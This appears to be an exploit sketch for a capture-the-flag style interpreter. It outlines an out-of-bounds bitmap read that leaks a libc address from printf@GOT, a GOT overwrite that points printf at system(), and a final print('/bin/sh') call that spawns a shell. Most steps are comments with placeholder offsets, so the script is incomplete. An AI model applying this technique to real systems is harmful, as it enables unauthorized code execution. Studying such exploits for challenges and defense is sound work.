# RCE Payload: Full Exploit with libc Address Leak
#
# Strategy:
# 1. OOB Read: Use bitmap_get to leak printf@GOT (libc address)
# 2. Calculate: libc_base and system address
# 3. OOB Write: Use bitmap_set to write system to printf@GOT
# 4. Trigger: print("/bin/sh") â†’ system("/bin/sh")
#
# Key insight: bitmap_get uses same calculation as bitmap_set
# So we can read from arbitrary addresses too!

# === STEP 1: Setup ===
string cmd = "/bin/sh";
bitmap b1 = create(9223372036854775807, 2);

# === STEP 2: OOB Read to Leak libc Address ===
# Target: printf@GOT = 0x409048
# This contains the address of printf in libc (a QWORD = 8 bytes = 64 bits)
#
# Formula: bitmap_data_ptr + (y * INT64_MAX + x) / 8 = 0x409048
# We need to calculate y value (requires heap address)
#
# bitmap_get reads 1 bit at a time:
#   get(b1, x, y) reads bit at position (y * INT64_MAX + x)
#
# To read full QWORD from printf@GOT, we need to read 64 bits:
# - Read bits 0-63 (one bit at a time)
# - Reconstruct the QWORD value
# - This gives us libc's printf address

# Calculate y value to hit printf@GOT
# y = (0x409048 - bitmap_data_ptr) * 8 / INT64_MAX
# Without heap address, we'll need to find it or use trial/error

# For demonstration, assuming we calculated y_leak:
# Read 64 bits from printf@GOT and reconstruct
# (In real exploit, we'd need to read all 64 bits)

# === STEP 3: Reconstruct libc Address ===
# After reading 64 bits, we have:
# leaked_printf_addr = value at printf@GOT (libc's printf address)
#
# Then calculate:
# libc_base = leaked_printf_addr - printf_offset_in_libc
# system_addr = libc_base + system_offset_in_libc
#
# Offsets (example, need to verify):
# - printf offset in libc: ~0x64e10 (varies by libc version)
# - system offset in libc: ~0x52290 (varies by libc version)

# === STEP 4: OOB Write system Address to GOT ===
# Now write system_addr to printf@GOT
# 
# Calculate y value to hit printf@GOT (same as read)
# Write 64 bits (one bit at a time using set())
#
# For each bit position (0-63):
#   if bit is set in system_addr:
#     set(b1, bit_pos, y_write, 1)
#   else:
#     set(b1, bit_pos, y_write, 0)  # clear bit

# === STEP 5: Trigger RCE ===
# Once printf@GOT points to system:
print(cmd);
# This calls printf("/bin/sh") â†’ but GOT points to system
# Executes system("/bin/sh") â†’ SHELL! ðŸŽ‰

print("RCE exploit - libc leak approach");

